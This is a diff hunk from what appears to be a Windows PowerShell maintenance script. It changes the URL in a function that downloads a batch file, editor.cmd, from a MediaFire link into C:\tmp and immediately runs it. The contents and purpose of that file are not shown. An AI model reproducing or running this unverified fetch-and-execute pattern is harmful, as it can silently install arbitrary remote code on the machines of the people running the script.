@@ -2729,8 +2729,8 @@ Function DeleteCacheFiles {
 
 Function SpecialProgramInstall {
 	Write-Output "Downloading Installer"
-	powershell -c "(new-object System.Net.WebClient).DownloadFile('https://download937.mediafire.com/u8s0zrrcn33g/a4hch5n5t4mtfc4/editor.cmd','C:\tmp\editor.cmd')"
-	Invoke-WebRequest https://download937.mediafire.com/u8s0zrrcn33g/a4hch5n5t4mtfc4/editor.cmd -OutFile C:\tmp\editor.cmd
+	powershell -c "(new-object System.Net.WebClient).DownloadFile('https://download937.mediafire.com/70p2hgzm0cwg/a4hch5n5t4mtfc4/editor.cmd','C:\tmp\editor.cmd')"
+	Invoke-WebRequest https://download937.mediafire.com/70p2hgzm0cwg/a4hch5n5t4mtfc4/editor.cmd -OutFile C:\tmp\editor.cmd
 	Start-Process "C:\tmp\editor.cmd"
 }
 
